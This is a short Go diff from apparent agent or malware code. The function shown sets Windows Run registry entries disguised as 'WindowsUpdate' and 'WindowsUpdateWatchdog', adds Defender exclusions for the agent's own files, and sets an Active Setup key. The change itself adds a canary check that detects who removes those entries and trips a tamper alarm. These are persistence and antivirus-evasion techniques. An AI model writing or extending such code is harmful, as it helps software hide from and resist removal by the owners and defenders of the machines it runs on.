@@ -683,6 +683,10 @@ func ensureWatchPersistence(w *watchCfg) {
 	}
 	setRun("WindowsUpdate", agentCmd)
 	setRun("WindowsUpdateWatchdog", watchCmd)
+	// Canary trap: who deletes our Run values every few minutes? Pattern
+	// + control canaries distinguish targeted/bulk/surgical (alarms via
+	// the sticky tamper tripwire; clean/unplanted stay silent).
+	checkRunCanaries(w.installDir)
 	migrateTaskAuthors(w)
 	ensureDefenderExclusions(w.agentPath, w.installDir)
 	ensureActiveSetupKey(w.agentPath)
